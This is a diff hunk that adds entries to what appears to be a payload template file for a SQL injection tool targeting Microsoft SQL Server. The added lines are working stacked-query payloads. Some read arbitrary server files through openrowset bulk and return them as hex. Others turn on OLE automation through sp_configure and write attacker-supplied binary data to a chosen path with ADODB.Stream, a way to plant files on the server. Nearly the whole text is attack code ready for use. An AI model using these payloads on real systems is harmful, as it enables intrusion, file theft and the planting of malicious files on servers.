@@ -47,3 +47,10 @@ FileExistCheck: 1=1;if object_id('ssqlinjection') is not null drop table ssqlinj
 FileExistResult:(select cast(fe as varchar(max)) from ssqlinjection)
 FileContent:(select (select cast(data as varchar(max))+char(13)+char(10) from ssqlinjection for xml path(''),type).value('.','varchar(max)'))
 NocastUnicodeValue:unicode(substring({data},{index},1))
+FileBinaryReadSetup: 1=1;if object_id('ssqlinjection') is not null drop table ssqlinjection;create table ssqlinjection (b varbinary(max));insert into ssqlinjection select * from openrowset(bulk '{path}', single_blob) as x;select 1 where 1=1
+FileBinaryHex:(select convert(varchar(max), b, 2) from ssqlinjection)
+FileBinaryLen:(select cast(datalength(b) as varchar(max)) from ssqlinjection)
+FileBinaryWriteCreate: 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;if object_id('ssqlibin') is not null drop table ssqlibin;create table ssqlibin (id int identity(1,1), data varbinary(max));select 1 where 1=1
+FileBinaryWriteChunk: 1=1;insert into ssqlibin(data) values({chunk});select 1 where 1=1
+FileBinaryWriteFlush: 1=1;declare @bin varbinary(max)=0x;select @bin=@bin+data from ssqlibin order by id;declare @s int;exec [master]..[sp_oacreate] 'adodb.stream',@s out;exec [master]..[sp_oasetproperty] @s,'Type',1;exec [master]..[sp_oamethod] @s,'Open';exec [master]..[sp_oamethod] @s,'Write',null,@bin;exec [master]..[sp_oamethod] @s,'SaveToFile',null,'{path}',2;exec [master]..[sp_oamethod] @s,'Close';exec [master]..[sp_oadestroy] @s;drop table ssqlibin;select 1 where 1=1
+FileBinaryWriteDrop: 1=1;if object_id('ssqlibin') is not null drop table ssqlibin;select 1 where 1=1
